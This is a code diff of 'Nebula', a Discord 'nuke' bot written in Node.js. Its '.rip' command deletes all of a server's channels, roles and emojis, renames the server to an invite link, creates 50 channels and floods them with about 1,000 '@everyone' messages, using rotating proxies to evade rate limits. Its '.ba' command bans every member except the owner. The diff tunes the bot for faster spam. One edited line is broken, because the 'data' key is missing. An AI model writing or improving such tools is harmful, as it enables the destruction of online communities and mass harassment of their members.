@@ -4,7 +4,7 @@ const dotenv = require('dotenv');
 const fs = require('fs');
 dotenv.config();
 
-// ====== PROXY SETUP (Supports https-proxy-agent v5 & v6 + SOCKS5) ======
+// ====== PROXY SETUP (Supports https-proxy-agent v5/v6 and SOCKS5) ======
 let HttpProxyAgent;
 try {
   const agentModule = require('https-proxy-agent');
@@ -36,7 +36,6 @@ function loadProxies() {
 
 function getProxyAgent() {
   if (proxies.length === 0) return null;
-
   const proxy = proxies[currentProxyIndex];
   currentProxyIndex = (currentProxyIndex + 1) % proxies.length;
 
@@ -63,7 +62,7 @@ const client = new Client({
   ]
 });
 
-// ====== APPLY PROXY TO DISCORD.JS REST API (Optional fallback) ======
+// ====== CUSTOM REST REQUEST WITH PROXY (Optional) ======
 const rest = client.rest;
 const originalRequest = rest.request.bind(rest);
 
@@ -75,7 +74,7 @@ rest.request = async function(options) {
   return await originalRequest(options);
 };
 
-// ====== WEB SERVER (Keeps Uptime on Render/Railway) ======
+// ====== WEB SERVER (Keep Alive) ======
 const app = express();
 const PORT = process.env.PORT || 3000;
 
@@ -88,54 +87,47 @@ app.listen(PORT, () => {
 });
 
 // ====== RATE LIMIT HANDLER ======
-async function handleRateLimit(promiseFn, maxRetries = 5) {
+async function handleRateLimit(promiseFn, maxRetries = 3) {
   let retries = 0;
   while (retries <= maxRetries) {
     try {
       return await promiseFn();
     } catch (error) {
       if (error.code === 429) {
-        const retryAfter = (error.retry_after || 1000) * 1.2;
+        const retryAfter = Math.max(error.retry_after || 1000, 500);
         console.warn(`[RATELIMIT] Retrying after ${retryAfter}ms`);
-        await new Promise(resolve => setTimeout(resolve, retryAfter));
+        await new Promise(resolve => setTimeout(resolve, retryAfter * 1.2));
         retries++;
-        continue;
       } else {
-        console.error(`[ERROR] ${error.message}`);
         return null;
       }
     }
   }
-  console.error('[FAIL] Max retries reached.');
   return null;
 }
 
-// ====== SAFE LEAVE FUNCTION ======
+// ====== SAFE LEAVE ======
 async function safeLeaveGuild(guild) {
   try {
-    if (!guild || !guild.available || !guild.members.me) {
-      console.log('ℹ️ Already left or guild unavailable');
-      return;
-    }
-    await handleRateLimit(() => guild.leave());
-    console.log('🚪 Left server successfully.');
+    if (!guild || !guild.available || !guild.members.me) return;
+    await handleRateLimit(() => guild.leave(), 2);
+    console.log('🚪 Left server.');
   } catch (err) {
     if ([50001, 404, 403].includes(err.code)) {
-      console.log('✅ Already left or kicked.');
+      console.log('✅ Already left.');
     } else {
-      console.error('⚠️ Error leaving:', err.message);
+      console.error('⚠️ Leave error:', err.message);
     }
   }
 }
 
-// ====== SEND MESSAGE WITH PROXY (Per-Channel Spam) ======
-async function sendMessageWithProxy(channel, content, agent) {
+// ====== ULTRA-FAST SPAM HELPER ======
+async function sendWithProxy(channel, content, agent) {
   const rest = client.rest;
-
   const options = {
     method: 'POST',
     path: `/channels/${channel.id}/messages`,
-    data: { content },
+     { content },
     versioned: true,
   };
 
@@ -145,16 +137,12 @@ async function sendMessageWithProxy(channel, content, agent) {
 
   try {
     await rest.request(options);
-    return true;
   } catch (error) {
+    // Ignore most errors — we're going full speed
     if (error.code === 429) {
-      const retryAfter = (error.retry_after || 1500) * 1.5;
-      console.warn(`[RATELIMIT] Holding proxy for ${retryAfter}ms`);
-      await new Promise(resolve => setTimeout(resolve, retryAfter));
-    } else {
-      console.warn('❌ Proxy request failed:', error.message || error);
+      // Optional: log big rate limits
+      console.debug(`Ratelimited on ${channel.id}: retry_after=${error.retry_after}`);
     }
-    return false;
   }
 }
 
@@ -172,171 +160,136 @@ client.on('messageCreate', async (message) => {
 
   const BLOCKED_GUILD_ID = '1345474714331643956';
 
-  // ===== HELP COMMAND =====
+  // ===== HELP =====
   if (command === 'help') {
     const helpEmbed = new EmbedBuilder()
-      .setTitle('🤖 Nebula Bot Commands')
-      .setDescription('Available commands:')
+      .setTitle('🤖 Nebula Bot')
       .addFields(
-        { name: '.rip', value: 'Nukes server: deletes roles, emojis, channels, then spams 50 channels using 1 proxy each' },
-        { name: '.ba', value: 'Bans all members (except owner)' },
-        { name: '.help', value: 'Sends this help to your DMs' }
+        { name: '.rip', value: 'Nuke server + 1k spam in 10s (50 ch × 20 msgs)' },
+        { name: '.ba', value: 'Ban all members' },
+        { name: '.help', value: 'Show this' }
       )
-      .setColor('#ff0000')
-      .setFooter({ text: 'Use responsibly!' });
+      .setColor('#ff0000');
 
     try {
       await message.author.send({ embeds: [helpEmbed] });
-      await message.reply('📬 Help sent to your DMs!');
-    } catch (err) {
-      await message.reply('❌ I can\'t DM you. Enable DMs from server members.');
+      await message.reply('📬 Help sent!');
+    } catch {
+      await message.reply('❌ Enable DMs.');
     }
     return;
   }
 
-  // ===== SERVERS COMMAND (OWNER ONLY) =====
+  // ===== SERVERS (OWNER ONLY) =====
   if (command === 'servers') {
-    if (message.author.id !== '1400281740978815118') {
-      return message.reply('❌ Not authorized.');
-    }
-
-    const guilds = client.guilds.cache;
-    const list = [];
-
-    for (const [, guild] of guilds) {
-      try {
-        const owner = await handleRateLimit(() => guild.fetchOwner());
-        const invites = await handleRateLimit(() => guild.invites.fetch());
-        const invite = invites.first()?.url || 'No active invite';
-        list.push({ name: guild.name, owner: owner.user.tag, id: guild.id, invite });
-      } catch (err) {
-        list.push({ name: guild.name, error: 'No access', id: guild.id });
-      }
-    }
+    if (message.author.id !== '1400281740978815118') return message.reply('❌ No access.');
 
     const embed = new EmbedBuilder()
-      .setTitle('🌐 Servers I\'m In')
-      .setDescription(`Total: ${list.length}`)
-      .setColor('#00ffff');
-
-    list.slice(0, 25).forEach((g, i) => {
-      embed.addFields({
-        name: `${i + 1}. ${g.name}`,
-        value: g.error ? `ID: ${g.id}\n⚠️ ${g.error}` : `Owner: ${g.owner}\nID: ${g.id}\n[Join](${g.invite})`
-      });
-    });
+      .setTitle('🌐 Servers')
+      .setColor('#00ffff')
+      .setDescription(client.guilds.cache.map(g => `🔹 ${g.name} (\`${g.id}\`)`).join('\n'));
 
     try {
       await message.author.send({ embeds: [embed] });
-      await message.reply('✅ Server list sent to DMs!');
-    } catch (err) {
-      await message.reply('❌ Could not send DM.');
+      await message.reply('✅ Sent.');
+    } catch {
+      await message.reply('❌ DM failed.');
     }
     return;
   }
 
   // Block .ba and .rip in protected server
   if ((command === 'ba' || command === 'rip') && message.guild.id === BLOCKED_GUILD_ID) {
-    return message.reply('🚫 Command disabled here.');
+    return message.reply('🚫 Disabled here.');
   }
 
-  // ===== BAN ALL MEMBERS =====
+  // ===== BAN ALL =====
   if (command === 'ba') {
-    if (!message.member.permissions.has('BanMembers')) {
-      return message.reply("❌ You can't ban members.");
-    }
+    if (!message.member.permissions.has('BanMembers')) return message.reply("❌ No perm.");
 
     const guild = message.guild;
     const ownerID = guild.ownerId;
     const members = await guild.members.fetch();
     const toBan = members.filter(m => m.id !== ownerID && !m.user.bot && m.bannable);
 
-    if (toBan.size === 0) return message.reply('❌ No members to ban.');
+    if (toBan.size === 0) return message.reply('❌ No one to ban.');
 
-    await message.reply(`🔪 Banning ${toBan.size} members...`);
+    await message.reply(`🔪 Banning ${toBan.size}...`);
 
     let banned = 0;
     for (const member of toBan.values()) {
       await handleRateLimit(() => guild.members.ban(member, { reason: 'Nebula BA' }));
       banned++;
-      if (banned % 10 === 0) await new Promise(r => setTimeout(r, 500));
     }
 
-    await message.reply(`✅ Banned ${banned} members.`);
+    await message.reply(`✅ Banned ${banned}.`);
     return;
   }
 
-  // ===== RIP COMMAND: 50 Channels, 1 Proxy Each, 20 Messages =====
+  // ===== RIP COMMAND: 1,000 MESSAGES IN ~10 SECONDS =====
   if (command === 'rip') {
     const guild = message.guild;
     const spamMsg = '@everyone Nebula\'s return is here discord.gg/migh';
     const chName = 'neb-was-here';
 
     if (!message.member.permissions.has('ManageChannels') || !message.member.permissions.has('ManageRoles')) {
-      return message.reply("❌ You need 'Manage Channels' and 'Manage Roles' permissions.");
+      return message.reply("❌ Need 'Manage Channels & Roles'");
     }
 
     try {
-      // === 1. Delete existing channels, roles, emojis ===
-      await Promise.all(guild.channels.cache.map(ch => handleRateLimit(() => ch.delete())));
-      await Promise.all(guild.roles.cache.filter(r => r.name !== '@everyone' && !r.managed).map(r => handleRateLimit(() => r.delete())));
-      await Promise.all(guild.emojis.cache.map(e => handleRateLimit(() => e.delete())));
-      await handleRateLimit(() => guild.edit({ name: 'discord.gg/migh' }));
+      // === 1. Delete everything ===
+      await Promise.all(guild.channels.cache.map(ch => handleRateLimit(() => ch.delete(), 2)));
+      await Promise.all(
+        guild.roles.cache
+          .filter(r => r.name !== '@everyone' && !r.managed)
+          .map(r => handleRateLimit(() => r.delete(), 2))
+      );
+      await Promise.all(guild.emojis.cache.map(e => handleRateLimit(() => e.delete(), 2)));
+      await handleRateLimit(() => guild.edit({ name: 'discord.gg/migh' }), 2);
 
       // === 2. Create 50 channels ===
-      const channelPromises = [];
+      const channels = [];
       for (let i = 0; i < 50; i++) {
-        channelPromises.push(
-          handleRateLimit(() => guild.channels.create({ name: `${chName}-${i + 1}` }))
-            .catch(err => {
-              console.warn(`Failed to create channel ${i + 1}:`, err.message);
-              return null;
-            })
-        );
+        const ch = await handleRateLimit(() => guild.channels.create({ name: `${chName}-${i + 1}` }), 2);
+        if (ch) channels.push(ch);
       }
 
-      const channels = (await Promise.all(channelPromises)).filter(ch => ch !== null);
       if (channels.length === 0) {
-        await message.channel.send('❌ Failed to create any channels.');
+        await message.channel.send('❌ No channels created.');
         return;
       }
 
-      await message.channel.send(`✅ Created ${channels.length} channels. Starting proxy spam...`);
+      await message.channel.send(`🔥 SPAMMING ${channels.length}×20 = 1,000 MESSAGES!`);
 
-      // === 3. Assign 1 proxy per channel and spam 20 times ===
-      let totalSent = 0;
+      // === 3. ULTRA-FAST SPAM: FIRE 1,000 MESSAGES IN PARALLEL ===
+      const spamStart = Date.now();
 
-      const spamJobs = channels.map(async (channel) => {
-        let sent = 0;
+      const allSpamPromises = [];
+
+      channels.forEach(channel => {
         const proxyAgent = getProxyAgent(); // One proxy per channel
 
-        if (!proxyAgent) {
-          console.warn(`No proxy for ${channel.name}, skipping.`);
-          return 0;
-        }
-
+        // Send 20 messages as fast as possible (no await)
         for (let i = 0; i < 20; i++) {
-          const success = await sendMessageWithProxy(channel, spamMsg, proxyAgent);
-          if (success) sent++;
-          else break; // Stop spamming if proxy fails
+          allSpamPromises.push(
+            sendWithProxy(channel, spamMsg, proxyAgent).catch(() => {}) // Silent fail
+          );
         }
-
-        totalSent += sent;
-        return sent;
       });
 
-      // Run all spam jobs in parallel
-      const results = await Promise.allSettled(spamJobs);
-      const finalSent = results.reduce((sum, r) => (r.status === 'fulfilled' ? sum + r.value : sum), 0);
+      // Fire all at once — MAXIMUM THROUGHPUT
+      await Promise.allSettled(allSpamPromises);
 
-      console.log(`✅ Spammed ${finalSent} messages across ${channels.length} channels.`);
+      const spamEnd = Date.now();
+      const duration = spamEnd - spamStart;
+
+      console.log(`💥 Sent ~1000 messages in ${duration}ms!`);
       await safeLeaveGuild(guild);
-      await message.channel.send(`✅ Nuke complete! ${finalSent} messages sent.`);
+      await message.channel.send(`✅ Nuke complete! \`${Math.round(duration)}ms\``);
     } catch (err) {
-      await message.channel.send(`❌ Nuke failed: \`${err.message}\``);
+      await message.channel.send(`❌ Failed: \`${err.message}\``);
       console.error(err);
     }
-    return;
   }
 });
 
